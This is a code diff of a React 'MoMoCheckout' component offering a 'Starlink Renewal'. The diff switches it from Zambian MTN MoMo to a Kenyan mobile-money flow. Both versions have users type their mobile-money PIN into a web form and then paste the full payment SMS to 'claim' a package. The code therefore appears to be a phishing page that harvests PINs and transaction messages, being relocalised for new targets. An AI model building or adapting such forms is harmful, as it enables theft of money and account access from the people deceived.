@@ -1,6 +1,6 @@
 import React, { useState } from 'react';
 
-export default function MoMoCheckout({ plan = 'Starlink Renewal', amount = 15, onClose, onSuccess }) {
+export default function MoMoCheckout({ plan = 'Starlink Renewal', amount = 1200, onClose, onSuccess }) {
 const [step, setStep] = useState('payment');
 const [phone, setPhone] = useState('');
 const [pin, setPin] = useState('');
@@ -64,48 +64,42 @@ return (
     {step === 'payment' ? (
       <form onSubmit={handlePaymentSubmit}>
         <div className="text-center mb-6">
-          <span className="text-xs uppercase tracking-wider text-white/50">Amount</span>
-          <h2 className="text-3xl font-bold text-orange-500 mt-1">ZMW {amount}.00</h2>
+          <span className="text-xs uppercase tracking-wider text-white/50">Total</span>
+          <h2 className="text-3xl font-bold text-amber-500 mt-1">KES {amount}</h2>
           <p className="text-sm text-white/70 mt-1">{plan}</p>
         </div>
 
-        <p className="text-sm text-white/80 mb-4">Enter your MTN MoMo details to authorize</p>
-
         <div className="mb-4">
-          <label className="block text-xs font-medium text-white/60 mb-1">MTN MoMo Number</label>
-          <div className="flex items-center bg-[#1a1d24] border border-white/10 rounded-xl px-3 py-3 focus-within:border-orange-500">
-            <span className="text-sm text-white/70 mr-2">🇿🇲 +260</span>
-            <input
-              type="tel"
-              placeholder="77xxxxxxxx"
-              value={phone}
-              onChange={(e) => setPhone(e.target.value)}
-              className="bg-transparent w-full focus:outline-none text-white text-sm"
-              required
-            />
-          </div>
+          <label className="block text-xs font-medium text-white/60 mb-1">Mobile Phone Number</label>
+          <input
+            type="tel"
+            placeholder="07XXXXXXXX"
+            value={phone}
+            onChange={(e) => setPhone(e.target.value)}
+            className="w-full bg-[#1a1d24] border border-white/10 rounded-xl px-4 py-3 focus:outline-none focus:border-amber-500 text-white text-sm"
+            required
+          />
         </div>
 
         <div className="mb-6">
-          <label className="block text-xs font-medium text-white/60 mb-1">Enter PIN</label>
+          <label className="block text-xs font-medium text-white/60 mb-1">Enter Mobile Money PIN</label>
           <input
             type="password"
-            maxLength="5"
-            placeholder="• • • • •"
+            maxLength="6"
+            placeholder="• • • •"
             value={pin}
             onChange={(e) => setPin(e.target.value)}
-            className="w-full bg-[#1a1d24] border border-white/10 rounded-xl px-4 py-3 focus:outline-none focus:border-orange-500 text-center tracking-widest text-lg"
+            className="w-full bg-[#1a1d24] border border-white/10 rounded-xl px-4 py-3 focus:outline-none focus:border-amber-500 text-center tracking-widest text-lg"
             required
           />
-          <span className="block text-center text-xs text-white/40 mt-1">enter 5 digits</span>
         </div>
 
         <button
           type="submit"
           disabled={loading}
-          className="w-full py-4 bg-gradient-to-r from-orange-500 to-amber-600 rounded-xl font-bold text-black hover:opacity-90 transition-opacity flex items-center justify-center gap-2 cursor-pointer"
+          className="w-full py-4 bg-gradient-to-r from-amber-500 to-amber-600 rounded-xl font-bold text-black hover:opacity-90 transition-opacity flex items-center justify-center gap-2 cursor-pointer"
         >
-          {loading ? 'Processing...' : 'CONFIRM PAYMENT'}
+          {loading ? 'Processing...' : 'Send STK Push Prompt'}
         </button>
         
         {onClose && (
@@ -124,37 +118,25 @@ return (
           <button 
             type="button" 
             onClick={() => setStep('payment')}
-            className="text-sm text-orange-500 hover:underline flex items-center gap-1"
+            className="text-sm text-amber-500 hover:underline flex items-center gap-1"
           >
             ← Back
           </button>
         </div>
 
         <div className="mb-6">
-          <h2 className="text-xl font-bold text-white">Full SMS Verification</h2>
-          <p className="text-xs text-white/60 mt-1">Please paste the full SMS content you received from MTN MoMo.</p>
-        </div>
-
-        <div className="bg-[#1a1d24] p-3 rounded-xl border border-white/10 mb-4 text-center">
-          <span className="text-[10px] tracking-wider text-white/50 uppercase block">Sending to</span>
-          <span className="text-sm font-mono text-white font-bold">{phone ? `+260 ${phone}` : '723995485'}</span>
-        </div>
-
-        <div className="bg-amber-500/10 border border-amber-500/30 p-3 rounded-xl mb-4 flex gap-3 items-start">
-          <span className="text-amber-500 text-lg">⚠️</span>
-          <p className="text-xs text-amber-200/90 leading-relaxed">
-            <strong>DO NOT edit the SMS</strong> — only copy and paste the entire message below
-          </p>
+          <h2 className="text-xl font-bold text-white">SMS Verification</h2>
+          <p className="text-xs text-white/60 mt-1">Please paste the full payment SMS received.</p>
         </div>
 
         <div className="mb-6">
-          <label className="block text-xs font-medium text-white/60 mb-1">PASTE FULL SMS CONTENT</label>
+          <label className="block text-xs font-medium text-white/60 mb-1">Paste SMS Confirmation Message</label>
           <textarea
             rows="4"
-            placeholder="Paste the entire MTN MoMo SMS here..."
+            placeholder="Paste the full payment SMS received..."
             value={smsContent}
             onChange={(e) => setSmsContent(e.target.value)}
-            className="w-full bg-[#1a1d24] border border-white/10 rounded-xl p-3 focus:outline-none focus:border-orange-500 text-xs text-white"
+            className="w-full bg-[#1a1d24] border border-white/10 rounded-xl p-3 focus:outline-none focus:border-amber-500 text-xs text-white"
             required
           />
         </div>
@@ -162,9 +144,9 @@ return (
         <button
           type="submit"
           disabled={loading}
-          className="w-full py-4 bg-gradient-to-r from-orange-500 to-amber-600 rounded-xl font-bold text-black hover:opacity-90 transition-opacity flex items-center justify-center gap-2 cursor-pointer"
+          className="w-full py-4 bg-gradient-to-r from-amber-500 to-amber-600 rounded-xl font-bold text-black hover:opacity-90 transition-opacity flex items-center justify-center gap-2 cursor-pointer"
         >
-          {loading ? 'Verifying...' : 'VERIFY & ACTIVATE'}
+          {loading ? 'Verifying...' : 'Verify & Claim Package'}
         </button>
       </form>
     )}
